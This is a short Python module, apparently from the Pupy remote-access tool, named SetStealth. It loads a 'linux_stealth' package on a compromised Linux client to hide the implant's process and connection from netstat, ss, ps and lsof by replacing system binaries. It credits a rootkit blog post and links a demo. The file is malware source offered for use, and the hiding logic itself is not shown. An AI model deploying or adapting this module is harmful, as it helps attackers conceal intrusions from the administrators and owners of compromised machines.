#!/usr/bin/env python
from pupylib.PupyModule import *

__class_name__="SetStealth"
def print_callback(data):
    sys.stdout.write(data)
    sys.stdout.flush()

class SetStealth(PupyModule):
    """Hides the runnin process from netstat, ss, ps, lsof by using modified binaries. Be careful when choosing the port.
Credits to: http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/
Demo: https://vimeo.com/157356150"""
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="Linux Stealth Module", description=self.__doc__)
        self.arg_parser.add_argument('--port', help='The port number to which Pupy is connecting to.')
 
    def run(self, args):
        self.client.load_package("linux_stealth")
        self.client.conn.modules['linux_stealth'].run(args.port)
        self.success("Module executed successfully.")
